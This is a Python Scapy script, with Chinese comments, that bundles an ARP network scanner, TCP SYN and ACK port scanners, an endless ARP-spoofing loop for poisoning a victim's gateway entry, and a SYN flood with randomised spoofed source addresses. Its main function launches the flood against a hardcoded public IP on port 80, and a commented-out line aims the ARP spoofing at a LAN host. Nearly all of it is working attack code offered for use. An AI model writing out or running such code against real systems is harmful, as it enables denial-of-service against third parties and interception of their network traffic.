```python
#!/usr/bin/env python
# _*_ coding=utf-8 _*_
#https://scapy.readthedocs.io/en/latest/installation.html scapy安装文档windows需要安装Npcap 
from scapy.all import *
import sys
import time
import random

def arp_scan():
    for ipFix in range(1,254):#这个是从1循环到254
        ip = "192.168.2."+str(ipFix)#这个是组装成一个ip，这个大家根据实际需求修改呢
        arpPkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
        res = srp1(arpPkt, timeout=1, verbose=0)
        if res:
            print("IP: " + res.psrc + "     MAC: " + res.hwsrc+"  小可爱我找到你了噢！by:小菜")

def tcp_syn_scan(src_ip, src_port, des_ip):
    ip = IP(src=src_ip, dst=des_ip)
    desPort=80
    tcp = TCP(sport=src_port, dport=desPort, seq=1, flags='S')
    pkg = ip/tcp
    # c->s syn
    res = sr1(pkg,verbose=0)
    #res.display()
    if res == None or res.haslayer(TCP) == False:
        return

    fields   =   res.getlayer(TCP).fields
    if fields['flags'] != 0x12:#syn&ack  0x12    rst&ack 0x14
        return
    print("端口:"+ str(fields['sport'])+"  状态:打开   小可爱你被我发现了噢")

def tcp_ack_scan(src_ip, des_ip, des_port):
    ip = IP(src=src_ip, dst=des_ip)
    tcp = TCP(dport=des_port, flags='A')
    pkg = ip/tcp
    # c->s syn
    res = sr1(pkg,verbose=0,timeout=10)
    #res.display()
    if res == None or res.haslayer(TCP) == False:
        return

    fields   =   res.getlayer(TCP).fields
    print(fields)
    #if fields['flags'] != 0x12:#syn&ack  0x12    rst&ack 0x14
    #    continue
    #print("端口:"+ str(fields['sport'])+"  状态:打开   小可爱你被我发现了噢")

#src_mac 想把欺骗的包转发给谁就填谁的MAC地址
#dest_ip 欺骗谁就填谁的ip
#gateway_ip 网关ip
def arp_deception(src_mac, dest_ip, gateway_ip):
	p1=Ether(dst="ff:ff:ff:ff:ff:ff",src=src_mac)/ARP(pdst=dest_ip, psrc=gateway_ip)
	print("开始欺骗喽！by:小菜")
	while True:
		sendp(p1,verbose=0)
		time.sleep(0.1)#暂停100毫秒

#syn flood攻击
def syn_flood_attack(attack_ip, attack_port):
    print("开始DDos喽！by:小菜")
    while True:
        src_ip      =   str(random.randint(120,150))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))
        src_port    =   random.randint(1,65535)
        ip          =   IP(src=src_ip, dst=attack_ip)
        tcp         =   TCP(sport=src_port, dport=attack_port, flags='S')
        package     =   ip/tcp
        send(package,verbose=0)
def main(argv):
    #show_interfaces()#这句话是列出网卡列表，不需要的话去掉就可以啦！
    print("")
    #tcp_syn_scan("192.168.2.132", 12000, "192.168.2.1")
    #arp_deception("E8:4E:06:55:57:12", "192.168.2.183", "192.168.2.1")  # 我把包转发到我这里咯。
    syn_flood_attack("149.129.49.67",80)

if __name__ == "__main__":
        main(sys.argv[1:])
```